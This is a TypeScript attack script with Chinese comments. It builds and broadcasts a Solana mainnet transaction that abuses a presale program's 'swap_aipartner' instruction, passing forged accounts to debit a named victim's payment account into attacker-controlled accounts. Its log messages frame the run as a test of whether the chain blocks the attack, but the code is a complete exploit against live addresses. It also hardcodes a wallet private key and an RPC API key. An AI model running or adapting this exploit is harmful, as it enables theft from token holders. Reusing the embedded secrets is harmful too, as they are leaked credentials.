import {
    Connection,
    PublicKey,
    Keypair,
    Transaction,
    TransactionInstruction
} from "@solana/web3.js";
import { TOKEN_PROGRAM_ID } from "@solana/spl-token";
import bs58 from "bs58";
import { createHash } from "crypto";

// 计算 Anchor 指令 discriminator (global:swap_aipartner)
function getAnchorDiscriminator(name: string): Buffer {
    const preimage = `global:${name}`;
    return Buffer.from(createHash("sha256").update(preimage).digest()).subarray(0, 8);
}

async function attack() {
    const connection = new Connection(
        "https://mainnet.helius-rpc.com/?api-key=37673d77-fa71-41d2-9572-b8d4defa5cee",
        "confirmed"
    );

    // 黑客私钥与 Keypair
    const secretKeyStr = "2jiUyXqh2JrGdYQm9GfbyWhU5gS3so6fw5Ad8oj29Z5mekqj2B7qeo5TxZkSxf8CvZqSm7mbFsPVjJ1SViGDHhwS";
    const attackerKeyPair = Keypair.fromSecretKey(bs58.decode(secretKeyStr));

    const programId = new PublicKey("twKYosyivoy5K19pkNYyxgfGtp4kCtTHBm1cWWzMy3k");
    const presaleStateAddress = new PublicKey("9JBdwGcmps55rRiptJoTygXY6wJUTxvFTAujEc8wnQ2o");
    const aipartnerMintAddress = new PublicKey("Auofy4iomuR3zyJib7PyqQZQNbsnVZmpbtpLJyubZT3r");

    // 根据 PresaleState 计算授权 PDA
    const [presaleAuthorityPDA] = PublicKey.findProgramAddressSync(
        [Buffer.from("presale_authority"), presaleStateAddress.toBuffer()],
        programId
    );

    // 黑客伪造的账户参数：
    const victimPaymentAccount = new PublicKey("CRy1WF8PXd6MMBQ8rC1Gmu3VKcxSGbm678H14fwty4ix"); // 受害者付款账户
    const attackerVaultAccount = new PublicKey("5KAgnr4pLBjnLmHyNvfwwZDo1vZ9bFz7btRhHP7Fi9X1");  // 黑客截胡收款账户
    const attackerAipartnerAccount = new PublicKey("5KAgnr4pLBjnLmHyNvfwwZDo1vZ9bFz7btRhHP7Fi9X1"); // 黑客代币接收账户

    // 构建 SwapAipartner 指令数据：Discriminator (8 bytes) + amount (8 bytes, Little Endian)
    const discriminator = getAnchorDiscriminator("swap_aipartner");
    const amountBuffer = Buffer.alloc(8);
    amountBuffer.writeBigUInt64LE(BigInt(1_000000)); // 试图抽取 1_000000 额度
    const instructionData = Buffer.concat([discriminator, amountBuffer]);

    // 组装黑客攻击指令 (对应 Anchor 的 Context 账户顺序)
    const attackInstruction = new TransactionInstruction({
        programId,
        keys: [
            { pubkey: attackerKeyPair.publicKey, isSigner: true, isWritable: true },
            { pubkey: victimPaymentAccount, isSigner: false, isWritable: true },
            { pubkey: attackerVaultAccount, isSigner: false, isWritable: true },
            { pubkey: aipartnerMintAddress, isSigner: false, isWritable: false },
            { pubkey: attackerAipartnerAccount, isSigner: false, isWritable: true },
            { pubkey: presaleAuthorityPDA, isSigner: false, isWritable: false },
            { pubkey: presaleStateAddress, isSigner: false, isWritable: false },
            { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
        ],
        data: instructionData,
    });

    console.log("=========================================");
    console.log("☠️ 发起攻击测试：尝试越权划扣受害者资金...");
    console.log("攻击者公钥:", attackerKeyPair.publicKey.toBase58());
    console.log("目标受害者代币账户:", victimPaymentAccount.toBase58());
    console.log("=========================================");

    try {
        const tx = new Transaction().add(attackInstruction);
        const { blockhash } = await connection.getLatestBlockhash("confirmed");
        tx.recentBlockhash = blockhash;
        tx.feePayer = attackerKeyPair.publicKey;

        tx.sign(attackerKeyPair);

        const txid = await connection.sendRawTransaction(tx.serialize());
        console.log("🚨 警告：攻击交易已广播！TxID:", txid);

        const confirmation = await connection.confirmTransaction(txid, "confirmed");
        if (confirmation.value.err) {
            console.log("✅ 链上节点拒绝交易执行，拦截成功！错误原因:", JSON.stringify(confirmation.value.err));
        } else {
            console.log("🚨 警告：交易在链上成功打包，漏洞存在！");
        }
    } catch (err: any) {
        console.log("✅ 攻击被链上防御机制拦截！成功阻止越权划扣。");
        console.log("错误反馈信息:", err.message || err);
    }
}

attack().catch(console.error);
